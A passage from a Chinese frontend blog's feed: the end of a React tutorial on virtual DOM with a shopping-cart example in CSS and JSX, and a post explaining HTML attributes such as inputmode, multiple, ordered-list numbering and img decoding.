可以帮助我们从<strong>命令式编程</strong>转到了<strong>声明式编程</strong>的模式。</p><p><strong>下面是 React 官方的说法：</strong>Virtual DOM 是一种编程理念。 <br />● 在这个理念中，UI 以一种理想化或者说虚拟化的方式保存在内存中，并且它是一个相对简单的 JavaScript 对象<br />● 我们可以通过<code>ReactDOM.render</code>让 虚拟 DOM 和 真实 DOM 同步起来，这个过程中叫做协调（Reconciliation）；</p><p>这种编程的方式赋予了 React 声明式的 API： <br />● 只需要告诉 React 希望让 UI 是什么状态；<br />● React 来确保 DOM 和这些状态是匹配的；<br />● 不需要直接进行 DOM 操作，只可以从手动更改 DOM、属性操作、事件处理中解放出来；</p><p><a name="I05OO"></a></p><h2 id="七、案例练习"><a href="#七、案例练习" class="headerlink" title="七、案例练习"></a>七、案例练习<br /><br /></h2><p>下面就来做一个简单的案例，其要求如下：<br />● 在界面上以表格的形式，显示一些书籍的数据<br />● 在底部显示书籍的总价格<br />● 点击+或者点击-可以增加或减少书籍数量（如果为 1，那么不能继续－）<br />● 点击移除按钮，可以将书籍移除（当所有书籍移除完毕之后，显示：购物车为空~）</p><p>页面效果如下:</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1500604/1605541846406-fb10cd69-5806-4f49-8cf1-a33d3aef439c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1500604/1605541846406-fb10cd69-5806-4f49-8cf1-a33d3aef439c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>代码实现：</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line"><span class="selector-tag">table</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#eee</span>;</span><br><span class="line">  <span class="attribute">border-collapse</span>: collapse;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">th</span>, <span class="selector-tag">td</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#eee</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">16px</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">th</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#ccc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.count</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">5px</span>;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">              <span class="attr">price</span>: <span class="number">128.00</span>,</span><br><span class="line">              <span class="attr">count</span>: <span class="number">1</span></span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="title function_">renderBooks</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>  (</span><br><span class="line">          <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">th</span>&gt;</span>书籍名称<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">th</span>&gt;</span>出版日期<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">th</span>&gt;</span>价格<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">th</span>&gt;</span>购买数量<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">th</span>&gt;</span>操作<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                &#123;</span></span><br><span class="line"><span class="language-xml">                  this.state.books.map((item, index) =&gt; &#123;</span></span><br><span class="line"><span class="language-xml">                    return (</span></span><br><span class="line"><span class="language-xml">                      <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;index+1&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;item.name&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;item.date&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;this.formatPrice(item.price)&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                          <span class="tag">&lt;<span class="name">button</span> <span class="attr">disabled</span>=<span class="string">&#123;item.count</span> &lt;= <span class="string">1&#125;</span> <span class="attr">onClick</span>=<span class="string">&#123;e</span> =&gt;</span> this.changeBookCount(index, -1)&#125;&gt;-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                          <span class="tag">&lt;<span class="name">span</span> <span class="attr">className</span>=<span class="string">&quot;count&quot;</span>&gt;</span>&#123;item.count&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                          <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;e</span> =&gt;</span> this.changeBookCount(index, 1)&#125;&gt;+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;e</span> =&gt;</span> this.removeBook(index)&#125;&gt;移除<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                      <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    )</span></span><br><span class="line"><span class="language-xml">                  &#125;)</span></span><br><span class="line"><span class="language-xml">                &#125;</span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>总价格: &#123;this.getTotalPrice()&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">        )</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 购物车为空</span></span><br><span class="line">      <span class="title function_">renderEmptyTip</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>购物车为空~<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 条件渲染</span></span><br><span class="line">      <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">books</span>.<span class="property">length</span> ? <span class="variable language_">this</span>.<span class="title function_">renderBooks</span>(): <span class="variable language_">this</span>.<span class="title function_">renderEmptyTip</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 修改书籍数量</span></span><br><span class="line">      <span class="title function_">changeBookCount</span>(<span class="params">index, count</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> newBooks = [...<span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">books</span>];</span><br><span class="line">        newBooks[index].<span class="property">count</span> += count;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">          <span class="attr">books</span>: newBooks</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 移除书籍</span></span><br><span class="line">      <span class="title function_">removeBook</span>(<span class="params">index</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">          <span class="attr">books</span>: <span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">books</span>.<span class="title function_">filter</span>(<span class="function">(<span class="params">item, indey</span>) =&gt;</span> index != indey)</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 计算书籍总价格</span></span><br><span class="line">      <span class="title function_">getTotalPrice</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> totalPrice = <span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">books</span>.<span class="title function_">reduce</span>(<span class="function">(<span class="params">preValue, item</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> preValue + item.<span class="property">count</span> * item.<span class="property">price</span>;</span><br><span class="line">        &#125;, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">formatPrice</span>(totalPrice);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 处理书籍价格格式</span></span><br><span class="line">      <span class="title function_">formatPrice</span>(<span class="params">price</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> price !== <span class="string">&quot;number&quot;</span>) &#123;</span><br><span class="line">          price = <span class="title class_">Number</span>(<span class="string">&quot;aaa&quot;</span>) || <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;¥&quot;</span> + price.<span class="title function_">toFixed</span>(<span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(<span class="language-xml"><span class="tag">&lt;<span class="name">App</span>/&gt;</span></span>, <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;app&quot;</span>));</span><br></pre></td></tr></table></figure><p>通常我们会将渲染相关的函数放在 render 函数的上方，将功能性的函数放在 render 函数的下方。</p><p>需要注意， React 中设计原则中有一条: <strong>state 中的数据的不可变性，所以我们不能直接操作数组中元素，需要对其进行拷贝在进行操作</strong></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML 属性</title>
      <link href="/2023/07/04/frontend/html/html-shu-xing/"/>
      <url>/2023/07/04/frontend/html/html-shu-xing/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h2 id="1-inputmode"><a href="#1-inputmode" class="headerlink" title="1. inputmode"></a>1. inputmode</h2><p><code>inputmode</code>全局属性是一个枚举属性，它提供了用户在编辑元素或其内容时可能输入的数据类型的提示。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> inputmode=<span class="string">&quot;tel&quot;</span> /&gt;</span><br></pre></td></tr></table></figure><p><br />该属性可以取以下值：<br />● <strong>none：</strong>不使用虚拟键盘，这个时候页面需要使用自定义的键盘代替<br />● <strong>text：</strong>默认值，会显示标准输入键盘<br />● <strong>decimal：</strong>小数表示键盘，除了数字之外可能会有小数点 . 或者千分符逗号 ,。<br />● <strong>numeric：</strong>显示 0-9 的数字键盘。<br />● <strong>tel：</strong>手机数字键盘，会有星号 * 或者井号 # 键。<br />● <strong>search：</strong>提交按钮会显示 ‘search’ 或者 ‘搜索’。<br />● <strong>email：</strong>键盘上会有 @ 符号键。<br />● <strong>url：</strong>键盘上会有斜杠 &#x2F; 符号键。</p><p>当我们将 <code>inputmode</code> 属性设置为 <code>tel</code> 时，调起的虚拟键盘如下</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1661098813232-0e91a0f4-ac85-4010-8289-a57ea5bc6575.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1661098813232-0e91a0f4-ac85-4010-8289-a57ea5bc6575.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><h2 id="2-multiple"><a href="#2-multiple" class="headerlink" title="2. multiple"></a>2. multiple</h2><p><code>multiple</code>属性可设置或返回是否可有多个选项被选中。该属性可以用于 <code>input</code> 或 <code>select</code> 标签。</p><p>在 input 标签中，当指定类型为 <code>file</code> 或 <code>email</code> 时，可以设置 <code>multiple</code> 多选选项。<br />● 当类型为 <code>email</code> 时，输入值为逗号分隔的邮件列表，会从里表中的每个邮件地址中删除所有空格。<br />● 当类型为 <code>file</code> 时，用户可以选择多个文件。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;img&quot;</span> multiple&gt;</span><br></pre></td></tr></table></figure><p><br />在 <code>select</code> 标签中，当设置了 <code>multiple</code> 属性时，同时可以通过 <code>size</code> 属性来指定可选项的个数：</p><h2 id="3-自定义有序列表的属性"><a href="#3-自定义有序列表的属性" class="headerlink" title="3. 自定义有序列表的属性"></a>3. 自定义有序列表的属性</h2><p>在 <code>&lt;ol&gt;</code> 元素可以用于指定有序列表。我们可以通过一些属性来指定列表中的编号行为：</p><h3 id="（1）reversed"><a href="#（1）reversed" class="headerlink" title="（1）reversed"></a>（1）reversed</h3><p>以相反的顺序对项目进行编号（从高到低）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;ol reversed&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>浔阳江头夜送客，枫叶荻花秋瑟瑟。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>主人下马客在船，举酒欲饮无管弦。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>醉不成欢惨将别，别时茫茫江浸月。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>忽闻水上琵琶声，主人忘归客不发。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>寻声暗问弹者谁？琵琶声停欲语迟。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>移船相近邀相见，添酒回灯重开宴。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>千呼万唤始出来，犹抱琵琶半遮面。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">&lt;/ol&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1661095651889-4eb1ee87-e4f3-4ca0-bd69-7c2275708d74.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1661095651889-4eb1ee87-e4f3-4ca0-bd69-7c2275708d74.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>这里只有编号会发生变化，并不会影响内容的顺序。</p><h3 id="（2）start"><a href="#（2）start" class="headerlink" title="（2）start"></a>（2）start</h3><p>定义从哪个数字开始：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;ol start=<span class="string">&quot;10&quot;</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>浔阳江头夜送客，枫叶荻花秋瑟瑟。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>主人下马客在船，举酒欲饮无管弦。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>醉不成欢惨将别，别时茫茫江浸月。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>忽闻水上琵琶声，主人忘归客不发。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>寻声暗问弹者谁？琵琶声停欲语迟。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>移船相近邀相见，添酒回灯重开宴。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>千呼万唤始出来，犹抱琵琶半遮面。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">&lt;/ol&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1661095811647-50bc51ba-7cf6-497b-b3d6-148bd3a187cf.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1661095811647-50bc51ba-7cf6-497b-b3d6-148bd3a187cf.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><h3 id="（3）type"><a href="#（3）type" class="headerlink" title="（3）type"></a>（3）type</h3><p>用于定义是使用数字、字母还是罗马数字。<code>type</code> 属性接受表示编号类型的五个单字符值（a、A、i、I、1）之一。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;ol type=<span class="string">&quot;i&quot;</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>浔阳江头夜送客，枫叶荻花秋瑟瑟。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>主人下马客在船，举酒欲饮无管弦。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>醉不成欢惨将别，别时茫茫江浸月。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>忽闻水上琵琶声，主人忘归客不发。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>寻声暗问弹者谁？琵琶声停欲语迟。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>移船相近邀相见，添酒回灯重开宴。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>千呼万唤始出来，犹抱琵琶半遮面。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">&lt;/ol&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1661096009033-11498323-cf15-4a5a-8893-6b1347ec9aaf.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1661096009033-11498323-cf15-4a5a-8893-6b1347ec9aaf.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><h3 id="（4）value"><a href="#（4）value" class="headerlink" title="（4）value"></a>（4）value</h3><p>用于在特定列表项上指定自定义数字：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;ol&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>浔阳江头夜送客，枫叶荻花秋瑟瑟。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>主人下马客在船，举酒欲饮无管弦。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>醉不成欢惨将别，别时茫茫江浸月。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">value</span>=<span class="string">&quot;10&quot;</span>&gt;</span>忽闻水上琵琶声，主人忘归客不发。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>寻声暗问弹者谁？琵琶声停欲语迟。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>移船相近邀相见，添酒回灯重开宴。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>千呼万唤始出来，犹抱琵琶半遮面。<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">&lt;/ol&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1661096131707-c8eb0bc0-8552-4f14-8f91-933598f634b7.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1661096131707-c8eb0bc0-8552-4f14-8f91-933598f634b7.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><h2 id="4-decoding"><a href="#4-decoding" class="headerlink" title="4. decoding"></a>4. decoding</h2><p><code>&lt;img&gt;</code> 标签的 <code>decoding</code> 属性用于告诉浏览器使用何种方式解析图像数据。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;/images/example.png&quot;</span> alt=<span class="string">&quot;Example&quot;</span> decoding=<span class="string">&quot;async&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p><br />该属性可以取以下三个值：<br />●<strong>sync</strong>: 同步解码图像，保证与其他内容一起显示。<br />●<strong>async</strong>: 异步解码图像，加快显示其他内容。<br />●<strong>auto</strong>: 默认模式，表示不偏好解码模式。由浏览器决定哪种方式更适合用户。</p><p>此属性类似于在<code>&lt;script&gt;</code>上使用 <code>async</code> 属性。 